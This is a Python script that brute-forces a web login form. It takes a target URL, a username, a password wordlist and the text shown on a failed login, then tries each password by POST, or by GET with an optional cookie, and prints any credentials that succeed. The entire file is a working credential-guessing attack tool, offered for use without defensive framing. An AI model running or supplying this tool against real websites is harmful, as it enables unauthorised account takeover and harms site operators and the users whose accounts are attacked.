import requests
from termcolor import colored

url = input('[+] Enter Page URL: ')
username = input('[+] Enter Username: ')
pass_list = input('[+] Enter Password File Location: ')
login_failed = input('[+] Enter String That Occurs When Login Fails: ')
cookie_value = input('[+] Enter Cookie Value(Optional): ')

def cracking(username, url):
    for password in passwords:
        password = password.strip()
        print(colored(('Typing: ' + password), 'red'))
        data = {'username':username, 'password':password, 'Login':'submit'}
     
        if cookie_value != '': response = requests.get(url, params={'username':username, 'password':password, 'Login':'Login'}, cookies={'Cookie': cookie_value}) 
        else: response = requests.post(url, data=data)

        if login_failed in response.content.decode(): pass
        else: 
            print(colored(('[+] Found Username: ==> ' + username), 'green'))
            print(colored(('[+] Found Password: ==> ' + password), 'green'))

with open(pass_list, 'r') as passwords:
    cracking(username, url)

print('[!!!] Password is not exist in list')
